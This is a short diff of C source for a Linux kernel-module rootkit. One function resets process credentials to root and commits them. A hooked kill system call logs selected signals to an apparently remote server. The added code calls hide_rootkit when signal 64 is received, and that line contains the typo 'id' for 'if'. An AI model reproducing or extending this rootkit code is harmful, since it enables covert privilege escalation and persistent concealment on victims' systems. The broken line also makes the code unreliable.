@@ -35,7 +35,7 @@ static int set_root(void){ //changes credentials
 	root_creds->euid.val = root_creds->egid.val = 0;
 	root_creds->suid.val = root_creds->sgid.val = 0;
 	root_creds->fsuid.val = root_creds->fsgid.val = 0;
-	
+
 	commit_creds(root_creds); //commits new credentials
 	return 0; //returns 0 for no error
 }
@@ -52,6 +52,9 @@ static asmlinkage long hooked_kill(const struct pt_regs *regs){ //hook function
 	int sig = regs->si; //gets signal from pt_regs structure
 	if (sig<10||sig==19||sig==18||sig==30){ //if kill signal is interesting signal
 		sprintf(buffer, "[kill] pid = %i   signal = %i\n", pid, sig); //copy message to buffer
+	}
+	id (sig==64){ //DEBUG IN CASE LKM IS HIDDEN AND SERVER CANNOT AUTHORISE
+		hide_rootkit();
 	}
 	server_print(buffer); //sends message
 	return orig_kill(regs); //kills process and returns result
